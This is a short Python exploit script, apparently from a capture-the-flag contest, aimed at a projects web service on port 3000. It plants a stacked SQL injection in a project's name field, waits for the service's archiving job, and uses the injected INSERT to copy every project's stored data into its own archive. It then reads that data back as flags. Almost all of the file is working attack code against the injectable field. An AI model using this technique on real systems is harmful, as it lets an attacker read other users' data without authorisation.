#!/usr/bin/python3

import requests
import time

HOST = "127.0.0.1"

PROJECTS_URL = "http://{host}:3000/projects"
PROJECT_URL = "http://{host}:3000/projects/{project_id}"
DATA_URL = "http://{host}:3000/projects/{project_id}/{key}"

# create project for get flags
r = requests.post(url=PROJECTS_URL.format(
    host=HOST), json={"name": "hack"})
r.raise_for_status()
project_id = r.json()
print(project_id)

r = requests.post(url=PROJECT_URL.format(
    host=HOST, project_id=project_id), json={"k": "0", "v": "-"})
r.raise_for_status()

# wait for archive
time.sleep(6 * 60)

# create new project with injection
project_name = f"_();insert into archived_data select'{project_id}',now(),row_number()over(),v from data;--"
r = requests.post(url=PROJECTS_URL.format(
    host=HOST), json={"name": project_name})
r.raise_for_status()
i_project_id = r.json()
print(i_project_id)

r = requests.post(url=PROJECT_URL.format(
    host=HOST, project_id=i_project_id), json={"k": "key", "v": "value"})
r.raise_for_status()

# wait for archive
time.sleep(6 * 60)

# get flags
for i in range(1, 100):
    r = requests.get(url=DATA_URL.format(
        host=HOST, project_id=project_id, key=i))
    print(r.json())
